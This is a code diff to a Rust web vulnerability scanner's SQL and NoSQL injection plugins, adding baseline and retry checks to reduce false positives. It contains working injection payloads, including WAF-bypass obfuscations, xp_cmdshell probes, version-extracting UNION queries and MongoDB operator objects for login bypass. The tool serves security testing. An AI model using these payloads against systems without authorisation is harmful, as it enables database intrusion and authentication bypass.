@@ -88,19 +88,19 @@ impl ScanPlugin for SqliErrorPlugin {
                     "unrecognized token",
                 ],
             ),
-            // Extended triggers
-            ("1/0", &["division by zero", "divide by zero", "ORA-01476"]),
-            ("'||'", &["ORA-", "PostgreSQL", "syntax error"]),
+            // Extended triggers (DB-specific error strings only).
+            ("1/0", &["division by zero", "ORA-01476"]),
             ("1 EXEC xp_", &["xp_cmdshell", "xp_regread", "xp_enumdsn"]),
             (
                 r#"' AND extractvalue(1,concat(0x7e,version()))-- -"#,
-                &["XPATH syntax error", "~5.", "~8."],
-            ),
-            (
-                r#"' AND (SELECT * FROM (SELECT(SLEEP(0)))a)-- -"#,
-                &["syntax", "error"],
+                &["XPATH syntax error"],
             ),
         ];
+
+        // Control response: a DB error only counts if our payload introduced it.
+        let Some(baseline) = crate::verify::Baseline::fetch(client, &target.url).await else {
+            return vec![];
+        };
 
         for (payload, signatures) in payloads {
             let variants = build_injection_urls_adv(target, payload);
@@ -108,20 +108,21 @@ impl ScanPlugin for SqliErrorPlugin {
                 if let Some((_, body)) = get_body(client, &url).await {
                     let bl = body.to_lowercase();
                     for sig in *signatures {
-                        if bl.contains(&sig.to_lowercase()) {
+                        if crate::verify::signature_is_new(&baseline.body_lower, &bl, sig) {
                             return vec![
                                 Finding::new(
                                     "SQL Injection — Error-Based",
                                     Severity::Critical,
                                     &target.url,
-                                    "The server returns a verbose database error when a malformed SQL payload is injected, confirming SQL injection.",
+                                    "The server returns a verbose database error when a malformed SQL payload is injected — and the error is absent from the baseline — confirming SQL injection.",
                                     "Use parameterized queries. Suppress database errors in production responses.",
                                     "active/sqli-error",
                                 )
                                 .with_parameter(&param)
-                                .with_evidence(format!("Payload: `{}` → DB error signature: `{}`", payload, sig))
+                                .with_evidence(format!("Payload: `{}` → DB error signature `{}` (new vs baseline)", payload, sig))
                                 .with_cwe(89)
-                                .with_owasp("A03:2021 – Injection"),
+                                .with_owasp("A03:2021 – Injection")
+                                .confirmed(),
                             ];
                         }
                     }
@@ -162,6 +163,22 @@ impl ScanPlugin for SqliBooleanPlugin {
             ("1 AND 1=CONVERT(int,'1')", "1 AND 1=CONVERT(int,'A')"),
         ];
 
+        // Full baseline body so we can compare *structure*, not just size —
+        // a page whose length wobbles between requests won't false-positive.
+        let Some((_, baseline_body)) = get_body(client, &target.url).await else {
+            return vec![];
+        };
+
+        // A single request-to-request comparison of the baseline against itself
+        // tells us how "noisy" the page is (CSRF tokens, timestamps). If the
+        // page is inherently unstable we require a wider TRUE/FALSE gap.
+        let self_sim = match get_body(client, &target.url).await {
+            Some((_, b2)) => crate::verify::body_similarity(&baseline_body, &b2),
+            None => 1.0,
+        };
+        // Required separation between TRUE and FALSE, scaled by page noise.
+        let min_gap = (1.0 - self_sim).max(0.05) + 0.10;
+
         for (true_pl, false_pl) in pairs {
             let true_variants = build_injection_urls_adv(target, true_pl);
             let false_variants = build_injection_urls_adv(target, false_pl);
@@ -169,42 +186,57 @@ impl ScanPlugin for SqliBooleanPlugin {
             for ((param, true_url), (_, false_url)) in
                 true_variants.iter().zip(false_variants.iter())
             {
-                let baseline = get_body(client, &target.url)
-                    .await
-                    .map(|(_, b)| b.len())
-                    .unwrap_or(0);
-                let true_len = get_body(client, true_url)
-                    .await
-                    .map(|(_, b)| b.len())
-                    .unwrap_or(0);
-                let false_len = get_body(client, false_url)
-                    .await
-                    .map(|(_, b)| b.len())
-                    .unwrap_or(0);
+                let Some((_, true_body)) = get_body(client, true_url).await else {
+                    continue;
+                };
+                let Some((_, false_body)) = get_body(client, false_url).await else {
+                    continue;
+                };
 
-                // Heuristic: true response ≈ baseline, false response meaningfully different
-                let baseline_matches_true = (true_len as i64 - baseline as i64).abs() < 50;
-                let false_differs = (false_len as i64 - true_len as i64).abs() > 20;
+                let true_sim = crate::verify::body_similarity(&baseline_body, &true_body);
+                let false_sim = crate::verify::body_similarity(&baseline_body, &false_body);
 
-                if baseline_matches_true && false_differs && true_len > 0 && false_len > 0 {
-                    return vec![
-                        Finding::new(
-                            "SQL Injection — Boolean-Blind",
-                            Severity::Critical,
-                            &target.url,
-                            "The application returns different content for TRUE vs FALSE SQL conditions, indicating blind SQL injection. An attacker can enumerate the entire database bit-by-bit.",
-                            "Use parameterized queries. The vulnerability is exploitable even without visible error messages.",
-                            "active/sqli-boolean",
-                        )
-                        .with_parameter(param)
-                        .with_evidence(format!(
-                            "TRUE payload `{}` → {}B  |  FALSE payload `{}` → {}B  |  baseline → {}B",
-                            true_pl, true_len, false_pl, false_len, baseline
-                        ))
-                        .with_cwe(89)
-                        .with_owasp("A03:2021 – Injection"),
-                    ];
+                // TRUE must mirror the baseline while FALSE clearly diverges.
+                let looks_injectable =
+                    true_sim > 0.95 && (true_sim - false_sim) >= min_gap && false_sim < 0.95;
+                if !looks_injectable {
+                    continue;
                 }
+
+                // Confirmation round — repeat once to rule out transient noise.
+                let confirm = match (
+                    get_body(client, true_url).await,
+                    get_body(client, false_url).await,
+                ) {
+                    (Some((_, t2)), Some((_, f2))) => {
+                        let ts = crate::verify::body_similarity(&baseline_body, &t2);
+                        let fs = crate::verify::body_similarity(&baseline_body, &f2);
+                        ts > 0.95 && (ts - fs) >= min_gap
+                    }
+                    _ => false,
+                };
+                if !confirm {
+                    continue;
+                }
+
+                return vec![
+                    Finding::new(
+                        "SQL Injection — Boolean-Blind",
+                        Severity::Critical,
+                        &target.url,
+                        "The application returns baseline-equivalent content for a TRUE SQL condition and clearly different content for a FALSE one (reproduced across two rounds), indicating blind SQL injection. An attacker can enumerate the database bit-by-bit.",
+                        "Use parameterized queries. The vulnerability is exploitable even without visible error messages.",
+                        "active/sqli-boolean",
+                    )
+                    .with_parameter(param)
+                    .with_evidence(format!(
+                        "TRUE `{}` sim={:.2} vs FALSE `{}` sim={:.2} (baseline noise {:.2}, gap≥{:.2}), confirmed twice",
+                        true_pl, true_sim, false_pl, false_sim, 1.0 - self_sim, min_gap
+                    ))
+                    .with_cwe(89)
+                    .with_owasp("A03:2021 – Injection")
+                    .confirmed(),
+                ];
             }
         }
         vec![]
@@ -277,6 +309,12 @@ impl ScanPlugin for SqliTimePlugin {
                     && elapsed_ms >= TIMING_THRESHOLD_MS
                     && elapsed_ms >= baseline_ms + TIMING_THRESHOLD_MS
                 {
+                    // Confirm: the delay must reproduce, otherwise it was a
+                    // transient slow response, not a controllable time oracle.
+                    let (confirm_ms, confirm_ok) = timed_get(&long_client, &url).await;
+                    if !(confirm_ok && confirm_ms >= baseline_ms + TIMING_THRESHOLD_MS) {
+                        continue;
+                    }
                     return vec![
                         Finding::new(
                             "SQL Injection — Time-Based Blind",
@@ -291,11 +329,12 @@ impl ScanPlugin for SqliTimePlugin {
                         )
                         .with_parameter(&param)
                         .with_evidence(format!(
-                            "Payload: `{}` (db={}) → response in {}ms (baseline {}ms)",
-                            payload, db_label, elapsed_ms, baseline_ms
+                            "Payload: `{}` (db={}) → {}ms then {}ms on retry (baseline {}ms)",
+                            payload, db_label, elapsed_ms, confirm_ms, baseline_ms
                         ))
                         .with_cwe(89)
-                        .with_owasp("A03:2021 – Injection"),
+                        .with_owasp("A03:2021 – Injection")
+                        .confirmed(),
                     ];
                 }
             }
@@ -360,7 +399,8 @@ impl ScanPlugin for SqliUnionPlugin {
                                     col_count, canary_pos + 1, &payload[..payload.len().min(120)]
                                 ))
                                 .with_cwe(89)
-                                .with_owasp("A03:2021 – Injection"),
+                                .with_owasp("A03:2021 – Injection")
+                                .confirmed(),
                             ];
                         }
                     }
@@ -413,6 +453,11 @@ impl ScanPlugin for SqliStackedPlugin {
             for (param, url) in variants {
                 let (elapsed_ms, ok) = timed_get(&long_client, &url).await;
                 if ok && elapsed_ms > baseline_ms + 2500 {
+                    // Reproduce the delay before claiming a stacked-query oracle.
+                    let (confirm_ms, confirm_ok) = timed_get(&long_client, &url).await;
+                    if !(confirm_ok && confirm_ms > baseline_ms + 2500) {
+                        continue;
+                    }
                     return vec![
                         Finding::new(
                             "SQL Injection — Stacked Queries",
@@ -424,11 +469,12 @@ impl ScanPlugin for SqliStackedPlugin {
                         )
                         .with_parameter(&param)
                         .with_evidence(format!(
-                            "Technique: {} — delayed {}ms (baseline {}ms). Payload: `{}`",
-                            label, elapsed_ms, baseline_ms, payload
+                            "Technique: {} — delayed {}ms then {}ms on retry (baseline {}ms). Payload: `{}`",
+                            label, elapsed_ms, confirm_ms, baseline_ms, payload
                         ))
                         .with_cwe(89)
-                        .with_owasp("A03:2021 – Injection"),
+                        .with_owasp("A03:2021 – Injection")
+                        .confirmed(),
                     ];
                 }
             }
@@ -449,14 +495,22 @@ impl ScanPlugin for SqliOobPlugin {
         "sqli-oob"
     }
     fn description(&self) -> &str {
-        "SQLi OOB — DNS/HTTP callback payload injection (detect only, no listener)"
+        "SQLi OOB — DNS/HTTP callback payloads (requires RUSTZAP_OOB_DOMAIN listener)"
     }
 
     async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
-        // We inject OOB payloads and look for indicators in the response (error suppression,
-        // timing change, or explicit DNS attempt acknowledgement).
-        // In a real tool you'd pair this with a Burp Collaborator / interactsh server.
-        let canary_domain = "rustzap-oob-canary.example.com";
+        // Out-of-band injection can only be *confirmed* by an external listener
+        // (Burp Collaborator / interactsh) observing the callback. Inferring a
+        // hit from the HTTP response status is guesswork and produces false
+        // positives, so this plugin stays inert unless the operator supplies a
+        // listener domain via `RUSTZAP_OOB_DOMAIN`. When set, it dispatches the
+        // payloads (so callbacks reach the listener) and reports a single
+        // Tentative finding instructing the operator to check that listener.
+        let canary_domain = match std::env::var("RUSTZAP_OOB_DOMAIN") {
+            Ok(d) if !d.trim().is_empty() => d,
+            _ => return vec![],
+        };
+        let canary_domain = canary_domain.as_str();
 
         let payloads: &[(&str, &str)] = &[
             // MySQL - LOAD_FILE via UNC (Windows)
@@ -490,44 +544,41 @@ impl ScanPlugin for SqliOobPlugin {
             ),
         ];
 
+        // Dispatch every payload so any that execute reach the listener. We do
+        // NOT infer success from the HTTP response — that would be self-validation.
+        let mut dispatched = Vec::new();
         for (payload, label) in payloads {
             let variants = build_injection_urls_adv(target, payload);
             for (param, url) in variants {
-                if let Some((status, body)) = get_body(client, &url).await {
-                    let bl = body.to_lowercase();
-                    // Heuristic: if the OOB statement ran without an "invalid syntax" error,
-                    // but the normal functionality is broken (500 or different content), it may have fired.
-                    // We flag as informational/potential.
-                    let looks_accepted = !bl.contains("syntax error")
-                        && !bl.contains("you have an error")
-                        && status != 200;
-
-                    if looks_accepted {
-                        return vec![
-                            Finding::new(
-                                "SQL Injection — Potential Out-of-Band (OOB)",
-                                Severity::High,
-                                &target.url,
-                                format!(
-                                    "An OOB SQL payload ({}) did not produce a visible syntax error and caused an abnormal response (HTTP {}). Confirm with an interactsh/Burp Collaborator listener.",
-                                    label, status
-                                ),
-                                "Deploy an out-of-band listener (Burp Collaborator, interactsh) to confirm. If confirmed, patch immediately — OOB exfiltration bypasses all output filters.",
-                                "active/sqli-oob",
-                            )
-                            .with_parameter(&param)
-                            .with_evidence(format!(
-                                "Payload: `{}` → HTTP {} (no syntax error in body). OOB canary: {}",
-                                &payload[..payload.len().min(100)], status, canary_domain
-                            ))
-                            .with_cwe(89)
-                            .with_owasp("A03:2021 – Injection"),
-                        ];
-                    }
-                }
+                let _ = get_body(client, &url).await;
+                dispatched.push(format!("{} (param `{}`)", label, param));
             }
         }
-        vec![]
+
+        if dispatched.is_empty() {
+            return vec![];
+        }
+
+        vec![Finding::new(
+            "SQL Injection — Out-of-Band Payloads Dispatched",
+            Severity::Info,
+            &target.url,
+            format!(
+                "OOB SQLi payloads targeting listener `{}` were sent. Confirmation is only valid if a DNS/HTTP callback was observed on that listener — the HTTP response alone cannot prove this.",
+                canary_domain
+            ),
+            "Check your interactsh/Burp Collaborator listener for callbacks from the target. A callback confirms OOB SQL injection; no callback means no evidence here.",
+            "active/sqli-oob",
+        )
+        .with_evidence(format!(
+            "Dispatched {} OOB payload variant(s) to listener {}: {}",
+            dispatched.len(),
+            canary_domain,
+            dispatched.join("; ")
+        ))
+        .with_cwe(89)
+        .with_owasp("A03:2021 – Injection")
+        .tentative()]
     }
 }
 
@@ -562,10 +613,25 @@ impl ScanPlugin for SqliSecondOrderPlugin {
             return vec![];
         }
 
-        // We store a payload that would only error when retrieved later
-        let stored_payload = "rustzap' OR '1'='1";
+        // DB-specific error strings we look for on *retrieval* — a stored value
+        // that breaks a later query is what makes second-order injection real.
+        let db_signatures = [
+            "you have an error in your sql syntax",
+            "unclosed quotation mark",
+            "unterminated quoted string",
+            "syntax error at or near",
+            "sqlite3::query",
+            "sqlstate[",
+            "ora-00933",
+        ];
 
-        // Build form body with payload in each parameter
+        // A payload whose unbalanced quote surfaces only when it is later
+        // interpolated into another query.
+        let stored_payload = "rustzap'\"";
+
+        // Baseline of the retrieval surface (same URL) BEFORE storing anything.
+        let pre = crate::verify::Baseline::fetch(client, &target.url).await;
+
         for param in &target.parameters {
             let form_body: Vec<(&str, &str)> = target
                 .parameters
@@ -580,35 +646,38 @@ impl ScanPlugin for SqliSecondOrderPlugin {
                 })
                 .collect();
 
-            // POST the payload
-            let post_resp = client
+            // Store the payload.
+            let _ = client
                 .post(&target.url)
                 .form(&form_body)
                 .timeout(Duration::from_secs(8))
                 .send()
                 .await;
 
-            if let Ok(r) = post_resp {
-                let stored_status = r.status().as_u16();
-                // If stored without error, warn that second-order may be present
-                if stored_status < 400 {
-                    return vec![
-                        Finding::new(
-                            "Potential Second-Order SQL Injection",
-                            Severity::High,
+            // Trigger: re-fetch the endpoint and look for a DB error that was
+            // NOT present before we stored the payload. Only then is it real.
+            let baseline_lower = pre.as_ref().map(|b| b.body_lower.as_str()).unwrap_or("");
+            if let Some((_, body)) = get_body(client, &target.url).await {
+                let bl = body.to_lowercase();
+                for sig in &db_signatures {
+                    if crate::verify::signature_is_new(baseline_lower, &bl, sig) {
+                        return vec![Finding::new(
+                            "Second-Order SQL Injection",
+                            Severity::Critical,
                             &target.url,
-                            "A SQL injection payload was accepted by the server without sanitization. If this value is later used in a SQL query (e.g. during login or profile retrieval), second-order SQL injection may be possible.",
-                            "Sanitize and parameterize ALL SQL usage of stored user data, not just at initial input. Use ORMs with parameterized queries throughout.",
+                            "A SQL payload stored via this endpoint triggered a database error when the value was later retrieved, confirming second-order SQL injection.",
+                            "Parameterize ALL SQL usage of stored user data, not just at initial input. Never trust previously-stored values.",
                             "active/sqli-second-order",
                         )
                         .with_parameter(param)
                         .with_evidence(format!(
-                            "Payload `{}` stored via POST without error (HTTP {}). Manual follow-up required to confirm trigger.",
-                            stored_payload, stored_status
+                            "Stored `{}` in `{}`, then retrieval surfaced DB error `{}` (new vs pre-store baseline)",
+                            stored_payload, param, sig
                         ))
                         .with_cwe(89)
-                        .with_owasp("A03:2021 – Injection"),
-                    ];
+                        .with_owasp("A03:2021 – Injection")
+                        .confirmed()];
+                    }
                 }
             }
         }
@@ -632,57 +701,67 @@ impl ScanPlugin for SqliWafBypassPlugin {
     }
 
     async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
-        // These are WAF-bypass variants of classic error/boolean payloads
-        let payloads: &[(&str, &[&str])] = &[
-            // Inline comment obfuscation
-            (
-                "'/**/OR/**/1=1--",
-                &["error", "syntax", "mysql", "pg_query"],
-            ),
-            ("'/*!50000OR*/1=1--", &["error", "syntax", "mysql"]),
-            // Case variation
-            ("' oR '1'='1", &["error", "syntax", "warning"]),
-            ("' Or 1=1--", &["error", "syntax"]),
-            // URL double-encoding
-            ("%27%20OR%201%3D1--", &["error", "syntax", "you have"]),
-            // Null-byte injection (some WAFs stop at null byte)
-            ("'\x00 OR 1=1--", &["error", "syntax", "mysql"]),
-            // Whitespace alternatives (tab, newline)
-            ("'\tOR\t1=1--", &["error", "syntax"]),
-            ("'\nOR\n1=1--", &["error", "syntax"]),
-            // Scientific notation
-            ("1e0 UNION SELECT 1--", &["error", "syntax", "union"]),
-            // Hex encoding of keyword
-            ("' OR 0x313d31--", &["error", "syntax"]),
-            // MySQL specific version comment
-            ("' /*!UNION*/ SELECT 1--", &["error", "syntax"]),
-            // HPP (HTTP parameter pollution) — single value side
-            ("1' AND 0x313=0x313--", &["error", "syntax"]),
+        // WAF-bypass obfuscations of classic payloads. We only conclude a
+        // bypass when a DB-specific error appears that was NOT in the baseline —
+        // generic words like "error"/"syntax" are never used as a signal.
+        let payloads: &[&str] = &[
+            "'/**/OR/**/1=1-- -",
+            "'/*!50000OR*/1=1-- -",
+            "' oR '1'='1'-- -",
+            "%27%20OR%201%3D1-- -",
+            "'\x00 OR 1=1-- -",
+            "'\tOR\t1=1-- -",
+            "'\nOR\n1=1-- -",
+            "1e0 UNION SELECT 1-- -",
+            "' OR 0x313d31-- -",
+            "' /*!UNION*/ SELECT 1-- -",
         ];
 
-        for (payload, sigs) in payloads {
+        // DB-specific signatures shared with the error-based detector.
+        let db_signatures = [
+            "you have an error in your sql syntax",
+            "warning: mysql_",
+            "com.mysql.jdbc",
+            "unclosed quotation mark after the character string",
+            "microsoft ole db provider for sql server",
+            "incorrect syntax near",
+            "pg_query()",
+            "psqlexception",
+            "syntax error at or near",
+            "ora-00907",
+            "ora-00933",
+            "sqlite3::query",
+            "sqlstate[",
+        ];
+
+        let Some(baseline) = crate::verify::Baseline::fetch(client, &target.url).await else {
+            return vec![];
+        };
+
+        for payload in payloads {
             let variants = build_injection_urls_adv(target, payload);
             for (param, url) in variants {
                 if let Some((_, body)) = get_body(client, &url).await {
                     let bl = body.to_lowercase();
-                    for sig in *sigs {
-                        if bl.contains(sig) {
+                    for sig in &db_signatures {
+                        if crate::verify::signature_is_new(&baseline.body_lower, &bl, sig) {
                             return vec![
                                 Finding::new(
                                     "SQL Injection — WAF Bypass",
                                     Severity::Critical,
                                     &target.url,
-                                    "SQL injection was detected using a WAF bypass technique (comment obfuscation, encoding, or case variation). A WAF may be present but can be evaded.",
+                                    "SQL injection was confirmed using a WAF-bypass obfuscation (comment/encoding/case/whitespace): an obfuscated payload provoked a DB error absent from the baseline.",
                                     "Fix the underlying parameterization — WAF rules alone are not sufficient protection against SQLi.",
                                     "active/sqli-waf-bypass",
                                 )
                                 .with_parameter(&param)
                                 .with_evidence(format!(
-                                    "Bypass payload: `{}` → DB signature: `{}`",
+                                    "Bypass payload: `{}` → DB signature `{}` (new vs baseline)",
                                     payload, sig
                                 ))
                                 .with_cwe(89)
-                                .with_owasp("A03:2021 – Injection"),
+                                .with_owasp("A03:2021 – Injection")
+                                .confirmed(),
                             ];
                         }
                     }
@@ -720,6 +799,36 @@ impl ScanPlugin for NoSqlInjectionPlugin {
                 (r#"{"$in": ["admin", "root", "user"]}"#, "$in operator"),
             ];
 
+            // Control request: all-benign values. An operator injection is only
+            // interesting if it produces a *materially different* (successful)
+            // outcome than these plausible-but-wrong credentials would.
+            let control_obj: serde_json::Map<String, serde_json::Value> = target
+                .parameters
+                .iter()
+                .map(|p| {
+                    (
+                        p.clone(),
+                        serde_json::Value::String("rustzap_wrong_value".into()),
+                    )
+                })
+                .collect();
+            let control_body =
+                serde_json::to_string(&serde_json::Value::Object(control_obj)).unwrap_or_default();
+            let (control_status, control_text) = match client
+                .post(&target.url)
+                .header("Content-Type", "application/json")
+                .body(control_body)
+                .timeout(Duration::from_secs(8))
+                .send()
+                .await
+            {
+                Ok(r) => {
+                    let s = r.status().as_u16();
+                    (s, r.text().await.unwrap_or_default())
+                }
+                Err(_) => (0, String::new()),
+            };
+
             for param in &target.parameters {
                 for (op_payload, op_label) in json_payloads {
                     // Build JSON body replacing one field with the operator object
@@ -748,20 +857,34 @@ impl ScanPlugin for NoSqlInjectionPlugin {
                         let body = r.text().await.unwrap_or_default();
                         let bl = body.to_lowercase();
 
-                        // Auth bypass indicators
                         let auth_bypass = bl.contains("token")
                             || bl.contains("success")
                             || bl.contains("welcome")
                             || bl.contains("dashboard");
 
-                        if (status == 200 || status == 302) && auth_bypass {
+                        // Differential: the operator must SUCCEED where the benign
+                        // control FAILED, and the response must differ from it.
+                        let control_bl = control_text.to_lowercase();
+                        let control_succeeded = control_bl.contains("token")
+                            || control_bl.contains("success")
+                            || control_bl.contains("welcome")
+                            || control_bl.contains("dashboard");
+                        let differs_from_control =
+                            crate::verify::body_similarity(&control_text, &body) < 0.9
+                                || status != control_status;
+
+                        if (status == 200 || status == 302)
+                            && auth_bypass
+                            && !control_succeeded
+                            && differs_from_control
+                        {
                             return vec![
                                 Finding::new(
                                     "NoSQL Injection — MongoDB Operator Injection",
                                     Severity::Critical,
                                     &target.url,
                                     format!(
-                                        "MongoDB operator injection ({}) returned a successful response suggesting authentication bypass or unauthorized data access.",
+                                        "MongoDB operator injection ({}) succeeded where benign credentials failed, confirming authentication bypass / unauthorized data access.",
                                         op_label
                                     ),
                                     "Validate and sanitize all user input before using in MongoDB queries. Use allowlists for expected types. Never pass raw user objects as query conditions.",
@@ -769,11 +892,12 @@ impl ScanPlugin for NoSqlInjectionPlugin {
                                 )
                                 .with_parameter(param)
                                 .with_evidence(format!(
-                                    "Operator: {} — HTTP {} with auth/success indicator in response. Body: `{}`",
-                                    op_label, status, &body[..body.len().min(80)]
+                                    "Operator {} → HTTP {} success; benign control → HTTP {} (no success). Body: `{}`",
+                                    op_label, status, control_status, &body[..body.len().min(80)]
                                 ))
                                 .with_cwe(943)
-                                .with_owasp("A03:2021 – Injection"),
+                                .with_owasp("A03:2021 – Injection")
+                                .confirmed(),
                             ];
                         }
                     }
@@ -794,6 +918,14 @@ impl ScanPlugin for NoSqlInjectionPlugin {
                 .map(|(k, v)| (k.to_string(), v.to_string()))
                 .collect();
 
+            // Baseline: the query as-is. A NoSQL operator should broaden the
+            // result set — i.e. return a response that clearly differs from the
+            // original (more rows, an object that shouldn't have matched).
+            let baseline_body = get_body(client, &target.url)
+                .await
+                .map(|(_, b)| b)
+                .unwrap_or_default();
+
             for (key, _) in &params {
                 for (suffix, label) in get_payloads {
                     let new_url = target
@@ -801,26 +933,31 @@ impl ScanPlugin for NoSqlInjectionPlugin {
                         .replace(&format!("{}=", key), &format!("{}{}", key, suffix));
 
                     if let Some((status, body)) = get_body(client, &new_url).await {
-                        let bl = body.to_lowercase();
-                        if status == 200
-                            && (bl.contains("admin") || bl.contains("token") || bl.contains("user"))
-                        {
+                        // Confirmed only when the operator response is a 200 that
+                        // meaningfully diverges from the untouched-query baseline.
+                        let diverges = crate::verify::body_similarity(&baseline_body, &body) < 0.85;
+                        let grew = body.len() > baseline_body.len() + 32;
+                        if status == 200 && diverges && grew {
                             return vec![
                                 Finding::new(
                                     "NoSQL Injection — MongoDB GET Operator",
                                     Severity::High,
                                     &target.url,
                                     format!(
-                                        "MongoDB query operator injected via GET parameter ({}) returned privileged data.",
+                                        "A MongoDB query operator injected via GET parameter ({}) changed the result set versus the untouched query, indicating the operator reached the database.",
                                         label
                                     ),
                                     "Validate and sanitize all query parameters. Reject unexpected object types.",
                                     "active/nosql",
                                 )
                                 .with_parameter(key)
-                                .with_evidence(format!("Param `{}` with `{}` → HTTP 200 with privileged content", key, suffix))
+                                .with_evidence(format!(
+                                    "Param `{}` with `{}` → HTTP 200, response diverged from baseline ({}B vs {}B)",
+                                    key, suffix, body.len(), baseline_body.len()
+                                ))
                                 .with_cwe(943)
-                                .with_owasp("A03:2021 – Injection"),
+                                .with_owasp("A03:2021 – Injection")
+                                .confirmed(),
                             ];
                         }
                     }
@@ -874,54 +1011,44 @@ impl ScanPlugin for SqliFingerprintPlugin {
     }
 
     async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
-        // Each payload produces output only on one DB
+        // Strong, product-specific banners only — never bare version fragments
+        // like "3." or "8." that match dates, prices, and unrelated version
+        // strings. A match must also be new relative to the baseline.
         let fingerprints: &[(&str, DbType, &[&str])] = &[
-            // MySQL: @@version, version(), INFORMATION_SCHEMA
-            (
-                "' AND 1=CONVERT(int,@@version)-- -",
-                DbType::MySQL,
-                &["mysql", "mariadb", "10.", "8.", "5.7", "5.6"],
-            ),
             (
                 "' UNION SELECT @@version,NULL-- -",
                 DbType::MySQL,
-                &["mysql", "mariadb", "10.", "8.0"],
+                &["mysql community server", "-mariadb", "mariadb server"],
             ),
-            // PostgreSQL
             (
                 "' UNION SELECT version(),NULL-- -",
                 DbType::PostgreSQL,
-                &["postgresql", "postgre", "pg "],
+                &["postgresql 1", "postgresql 9", "postgresql on x86"],
             ),
-            (
-                "'; SELECT current_setting('server_version')-- -",
-                DbType::PostgreSQL,
-                &["postgresql", "14.", "15.", "16."],
-            ),
-            // MSSQL
             (
                 "' UNION SELECT @@version,NULL-- -",
                 DbType::Mssql,
-                &["microsoft sql server", "sql server 2019", "sql server 2022"],
+                &["microsoft sql server 20", "sql server (rtm)"],
             ),
-            (
-                "'; SELECT @@version-- -",
-                DbType::Mssql,
-                &["microsoft", "windows nt", "sql server"],
-            ),
-            // Oracle
             (
                 "' UNION SELECT banner,NULL FROM v$version-- -",
                 DbType::Oracle,
-                &["oracle database", "enterprise edition", "release"],
+                &[
+                    "oracle database 1",
+                    "oracle database 2",
+                    "oracle database 11g",
+                ],
             ),
-            // SQLite
             (
                 "' UNION SELECT sqlite_version(),NULL-- -",
                 DbType::SQLite,
-                &["3.", "sqlite"],
+                &["sqlite version 3", "sqlite 3."],
             ),
         ];
+
+        let Some(baseline) = crate::verify::Baseline::fetch(client, &target.url).await else {
+            return vec![];
+        };
 
         for (payload, db, signatures) in fingerprints {
             let variants = build_injection_urls_adv(target, payload);
@@ -929,7 +1056,7 @@ impl ScanPlugin for SqliFingerprintPlugin {
                 if let Some((_, body)) = get_body(client, &url).await {
                     let bl = body.to_lowercase();
                     for sig in *signatures {
-                        if bl.contains(sig) {
+                        if crate::verify::signature_is_new(&baseline.body_lower, &bl, sig) {
                             return vec![
                                 Finding::new(
                                     format!("Database Fingerprinted — {}", db),
@@ -944,11 +1071,12 @@ impl ScanPlugin for SqliFingerprintPlugin {
                                 )
                                 .with_parameter(&param)
                                 .with_evidence(format!(
-                                    "DB: {} — signature `{}` found via payload `{}`",
+                                    "DB: {} — banner `{}` (new vs baseline) via payload `{}`",
                                     db, sig, &payload[..payload.len().min(80)]
                                 ))
                                 .with_cwe(200)
-                                .with_owasp("A05:2021 – Security Misconfiguration"),
+                                .with_owasp("A05:2021 – Security Misconfiguration")
+                                .confirmed(),
                             ];
                         }
                     }
